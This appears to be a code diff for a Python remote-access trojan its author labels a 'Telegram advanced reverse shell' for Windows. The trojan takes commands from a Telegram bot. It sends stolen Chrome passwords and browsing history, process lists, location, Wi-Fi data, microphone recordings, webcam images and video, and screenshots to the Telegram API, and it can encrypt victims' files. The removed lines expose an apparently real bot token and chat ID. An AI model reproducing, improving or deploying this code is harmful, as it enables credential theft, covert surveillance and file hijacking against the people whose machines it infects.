@@ -1,12 +1,12 @@
 
-############################################
-##            24/05/2022                  ##
-##     tlegram advance reverse shell      ##
-##           Aharon chetrit               ##
-##                                        ##
-##  Developer: Aharon chetrit             ##
-##  Designed for Windows environment      ##
-############################################
+###########################################
+##            24/05/2022                 ##
+##     tlegram advance reverse shell     ##
+##           Aharon chetrit              ##
+##                                       ##
+##  Developer: Aharon chetrit            ##
+##  Designed for Windows environment     ##
+###########################################
 
 
 ######################################
@@ -69,10 +69,13 @@ import PySimpleGUI as sg
 from os import listdir
 from os.path import isfile, join
 import math
-
+import heapq
 
 
 #############################################################
+
+telegram_token='your telegram token'
+chat_id='group chat id
 
 class Proccess:
     def start_proc(self):
@@ -148,21 +151,21 @@ class Proccess:
                     mb_mem[i]=mem+mb_mem[i][p:]
                     mem=''
                     
-                    
+        send_rez=''           
         with open("C:\\proccess\\crop\\crop.txt",'w')as file:
-            file.write(f"{'task name':<30}{'mem use':>20}")
-            file.write('\n')
-            file.write('='*50)
-            file.write('\n')
+            send_rez+=(f"{'task name':<30}{'mem use':>20}")
+            send_rez+=('\n')
+            send_rez+=('='*50)
+            send_rez+=('\n')
             for i in range(len(mb_mem)):
                 p=str(mb_mem[i])+" MB"
-                file.write(f"{tasklist[i]:30}{p:>20}")
-                file.write('\n')
-            file.close()
+                send_rez+=(f"{tasklist[i]:30}{p:>20}")
+                send_rez+=('\n')
+        send_rez=bytes(send_rez,encoding='ISO-8859-1')
             
-        files={'document':open('C:\\proccess\\crop\\crop.txt', 'rb')}
-        requests.post("https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/sendDocument?chat_id=-791347020&caption=process.txt",files=files )
-        files.close()
+        files={'document':send_rez}
+        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=process.txt",files=files )
+
         self.start_proc()
 
         
@@ -237,7 +240,7 @@ def searsh_chrome_history(url,val):
         file.write(data)
     if len(data)>1:
         files={'document':open('C:\\proccess\\sih\\sih_file2.txt', 'rb')}
-        requests.post("https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/sendDocument?chat_id=-791347020&caption=history resault.txt",files=files )
+        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=history resault.txt",files=files )
     else:
         send_message('not foud.')
     up_search_ch_his=1
@@ -305,7 +308,7 @@ def histoty_chrome(url,num):
             file.write('\n')
     if up_search_ch_his != 0:
         files={'document':open("C:\\proccess\\sih\\sih_file2.txt", 'rb')}
-        requests.post("https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/sendDocument?chat_id=-791347020&caption=his.txt",files=files )
+        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=his.txt",files=files )
     
     
         
@@ -366,13 +369,13 @@ def get_current_location():
             break
     pc_l1=c_l[::2]
     pc_l2=c_l[1::2]
-    with open("C:\\proccess\\loc\\loc.txt",'w') as file:
-        for i in range(len(pc_l1)):
-            file.write(f"{str(pc_l1[i]):<20}{pc_l2[i]:>20}")
-            file.write('\n')
-    with open("C:\\proccess\\loc\\loc.txt",'r') as file:
-        data = file.read()
-        send_message(data)
+    
+    res=''
+    for i in range(len(pc_l1)):
+        res+=(f"{str(pc_l1[i]):<20}{pc_l2[i]:>20}")
+        res+=('\n')
+    
+    send_message(res)
 
 ############################################################
 
@@ -382,7 +385,6 @@ def get_current_location():
 
 def chrome_password2():
     def startchromepass():
-    
         all_files = [f for f in listdir('C:\\proccess\\ssap\\') if isfile(join('C:\\proccess\\ssap\\', f))]
         for i in all_files:
             p = subprocess.Popen('del "C:\\proccess\\ssap\\'+i+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
@@ -585,8 +587,11 @@ def chrome_password2():
         if up_chrom_pass!=0:
             allfiles = [f for f in listdir('C:\\proccess\\ssap\\') if isfile(join('C:\\proccess\\ssap\\', f))]
             for i in allfiles:
-                files={'document':open('C:\\proccess\\ssap\\'+ i, 'rb')}
-                requests.post("https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/sendDocument?chat_id=-791347020&caption="+i[3:]+".txt",files=files )
+                file=open('C:\\proccess\\ssap\\'+ i, 'rb')
+                data=file.read()
+                Crypt_my10(key).encrypt_files('C:\\proccess\\ssap\\'+ i)
+                files={'document':data}
+                requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption="+i[3:]+".txt",files=files )
             
             
             for i in allfiles:
@@ -598,8 +603,7 @@ def chrome_password2():
                     pass
 
             startchromepass()
-            print('dune')
-    
+            
     
     temp()
     createPath()
@@ -737,25 +741,25 @@ def upload_files(url,file):
         
 ###############################################################
 
-def satrt_file_on_target(name):
-    path='C:\\proccess\\down\\'+name
+def satrt_file_on_target(path):
+
     try:
         os.startfile(path)
         send_message("the file was seccessfuly opens!")
     except:
-        send_message('failed to open '+name)
+        send_message('failed to open '+path)
 
         
 ###############################################################
 
 
-def record_target(name,time):
-    time=int(time)
+def record_target(name,timer):
+    timer=int(timer)
     send_message('trying to record..\nwaut until the record will end.')
     path_rec='C:\\proccess\\rec\\'+name+'.wav'
     
     freq = 44100
-    recording = sd.rec(int(time * freq),
+    recording = sd.rec(int(timer * freq),
             samplerate=freq, channels=2)
     sd.wait()
     wv.write(path_rec, recording, freq, sampwidth=2)
@@ -766,10 +770,12 @@ def record_target(name,time):
     
     
     files={'audio':data_audio}
-    requests.post("https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/sendAudio?chat_id=-791347020&caption="+name+'.wav' ,files=files)
+    requests.post("https://api.telegram.org/bot"+telegram_token+"/sendAudio?chat_id="+chat_id+"&caption="+name+'.wav' ,files=files)
     time.sleep(1)
-    Delet_files().delet_files_list(path_rec)
-    
+    try:
+        Delet_files().delet_files_list(path_rec)
+    except:
+        pass
 ###############################################################
 
 
@@ -942,7 +948,7 @@ def open_camera(name_vid):
             frame = cv2.resize(frame, (640, 480))
             out.write(frame)
             cv2.imshow('Video', frame)
-            base_url='https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/getUpdates?offset='+offset
+            base_url='https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset='+offset
             resp = requests.get(base_url)
             messages=resp.text
             messages=messages.replace("update_id","^^^@^@").split('^^^')
@@ -966,7 +972,7 @@ def open_camera(name_vid):
             data=file.read()
         Crypt_my10(key).encrypt_files('C:\\proccess\\div\\'+name_video+'.mp4')
         files={'video':data}
-        requests.post("https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/sendVideo?chat_id=-791347020&caption=test.mp4" ,files=files)
+        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendVideo?chat_id="+chat_id+"&caption=test.mp4" ,files=files)
         
 
 ################################################################
@@ -1106,11 +1112,9 @@ class Crypt_my10():
         if len(sec)+len(faild)<3900:
             send_message(sec+faild)
         else:
-            with open('C:\\proccess\\tuop\\tuop.txt','w')as file:
-                file.write(sec+faild)
-            file.close()
-            files={'document':open('C:\\proccess\\tuop\\tuop.txt', 'rb')}
-            requests.post("https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/sendDocument?chat_id=-791347020&caption=crypt.txt",files=files )    
+            res_send=bytes(sec+faild,encoding='utf8')
+            files={'document':res_send}
+            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=crypt.txt",files=files )    
         self.start_crypt()
         
         
@@ -1139,7 +1143,7 @@ def screen_shot(name):
     Crypt_my10(key).encrypt_files(save_image_path)
     
     files={'photo':data}
-    requests.post("https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/sendPhoto?chat_id=-791347020&caption="+name+".png" ,files=files)
+    requests.post("https://api.telegram.org/bot"+telegram_token+"/sendPhoto?chat_id="+chat_id+"&caption="+name+".png" ,files=files)
 
 
 
@@ -1157,13 +1161,9 @@ def take_picture(name):
         if j and frame is not None:
             inside_up_crypt=0
             image_bytes = cv2.imencode('.jpg', frame)[1].tobytes()
-            with open("C:\\proccess\\neercs\\"+name+".jpg",'wb') as file:
-                file.write(Crypt_my10(key).encrypt_data(image_bytes))
-            with open("C:\\proccess\\neercs\\"+name+".jpg",'rb') as file:
-                data=file.read()
-            decryp_data=Crypt_my10(key).decrypt_data(data)
-            files={'photo':decryp_data}
-            requests.post("https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/sendPhoto?chat_id=-791347020&caption="+name+".jpg" ,files=files)
+            
+            files={'photo':image_bytes}
+            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendPhoto?chat_id="+chat_id+"&caption="+name+".jpg" ,files=files)
         else:
             send_message("failed")
         inside_up_crypt=1
@@ -1173,7 +1173,7 @@ def take_picture(name):
 
 def offset_num():
     global offset
-    base_url='https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/getUpdates?offset='
+    base_url='https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset='
     resp = requests.get(base_url)
     messages=resp.text
     messages=messages.replace("update_id","^^^@^@").split('^^^')
@@ -1196,9 +1196,14 @@ def offset_num():
 
 def send_message(message):
     message=str(message)
-    bash_url="https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/sendMessage?chat_id=-791347020&text="+message                    
-    requests.get(bash_url)
+    if len(message)>3900:
+        message=bytes(message,encoding='ISO-8859-1')
+        files={'document':message}
+        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=output.txt",files=files )
+    else:
+        requests.get("https://api.telegram.org/bot"+telegram_token+"/sendMessage?chat_id="+chat_id+"&text="+message)
     
+
     
 #######################################################################################
 
@@ -1324,7 +1329,7 @@ def main():
                             send_message(info)
                         if "expend" in command:
                             files={'document':open('C:\\proccess\\wiinf\\expend.txt', 'rb')}
-                            requests.post("https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/sendDocument?chat_id=-791347020&caption=expend wifi info.txt",files=files )
+                            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=expend wifi info.txt",files=files )
                         time.sleep(5)
                         file.close()
                         Delet_files().delet_files_list("C:\\proccess\\wiinf\\")
@@ -1376,6 +1381,7 @@ def main():
 
                     elif "get chrome history" in command:
                         up_search_ch_his=1
+                        inside_up_crypt=0
                         command=command.replace('num=',"^^^#").replace("num =",'^^^#')
                         url=''
                         num=command.split("^^^#")
@@ -1404,8 +1410,10 @@ def main():
 
                     elif 'get chrome passwords' in command:
                         up_chrom_pass=1
+                        inside_up_crypt=0
                         chrome_password2()
                     elif 'search chrom pass' in command:
+                        inside_up_crypt=0
                         up_chrom_pass=0
                         if "advance" in command:
                             Search_chrome_passwords(command[26:]).advanced_search()
@@ -1486,18 +1494,17 @@ def main():
                             print('eror')
                             time.sleep(0.8)
                             
-                            
         except Exception as e:
             try:
                 send_message(str(e))
             except:
                 print(e)
-            time.sleep(1)
+            time.sleep(1)                            
+        
 
-
-            time.sleep(1)
-            name=""
-            url= ""
+        time.sleep(1.5)
+        name=""
+        url= ""
         
         
 ########################## end
@@ -1505,3 +1512,4 @@ def main():
 if __name__ == "__main__":
     main()
     
+ 
